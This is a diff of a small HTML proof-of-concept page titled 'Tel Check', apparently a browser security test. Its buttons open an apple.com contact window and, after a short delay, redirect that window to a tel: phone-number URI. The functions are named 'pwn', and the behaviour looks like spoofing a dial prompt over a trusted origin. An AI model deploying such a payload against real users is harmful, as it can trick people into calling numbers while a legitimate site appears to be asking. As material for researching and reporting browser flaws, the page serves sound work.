@@ -1,5 +1,25 @@
-<script>  
-location.href = "tg:1"  
-//location.href = "tel:1"  
-setTimeout('location.href = "https://apple.com"', 500)  
-</script>  
+html
+<html>
+<head>
+<title>Tel Check</title>
+</head>
+<body>
+<li>click button 40 s <button onclick="pwn40()">clickme</button> </li>
+<li>click button 4000 s <button onclick="pwn4000()">clickme</button> </li>
+
+    <br>
+    
+
+    <script>
+var pwn40 = () => {
+win = window.open("https://www.apple.com/contact/ ", "test", "width=800 height=800");
+setTimeout("win.location = 'tel:tel:+919747 '", 40);
+}
+
+var pwn4000 = () => {
+win = window.open("https://www.apple.com/contact/ ", "test", "width=400 height=400");
+setTimeout("win.location = 'tel:+919747 '", 400);
+}
+</script>
+</body>
+</html>
